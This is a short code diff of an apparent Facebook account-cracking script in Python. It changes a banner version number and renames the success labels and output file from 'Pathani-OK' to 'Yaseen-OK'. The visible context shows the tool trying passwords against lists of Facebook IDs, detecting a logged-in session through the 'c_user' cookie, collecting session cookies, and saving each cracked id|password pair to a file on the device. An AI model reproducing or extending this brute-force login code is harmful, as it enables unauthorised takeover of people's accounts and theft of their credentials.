@@ -164,7 +164,7 @@ logo=("""\033[1;92m
 \033[1;39m \033[0;93m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m: \033[1;33m Abdul Yaseen
 \033[1;39m \033[0;94m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m: \033[1;34m group sell kardia ha 
 \033[1;39m \033[0;95m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m: \033[0;92mFREE AND ENJOY
-\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m: \033[1;32m1.3
+\033[1;39m \033[0;96m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m: \033[1;32m1.4
 \033[1;34m--------------------------------------------------""")
 def linex():
 	print('\33[1;37m--------------------------------------------------')
@@ -376,8 +376,8 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\033[1;92m[Pathani-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/Pathani-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\033[1;92m[Yaseen-OK] '+ids+' | '+pas+'\033[1;32m')
+				open('/sdcard/Yaseen-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
